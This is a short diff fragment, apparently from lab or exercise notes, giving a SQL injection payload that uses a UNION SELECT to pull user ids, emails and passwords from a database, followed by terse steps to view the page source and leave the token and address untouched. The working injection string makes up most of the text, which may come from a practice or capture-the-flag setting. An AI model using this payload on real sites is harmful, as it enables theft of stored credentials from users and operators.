@@ -6,4 +6,3 @@ after that past : "qwert'))+UNION+SELECT+id,+email,+password,+'4',+'5',+'6',+'7'
 dont forget to put(ctrl+A) them white cmd+u
 dont touch token and adresse ; 
 ![image](./assets/dbtest.png)
-
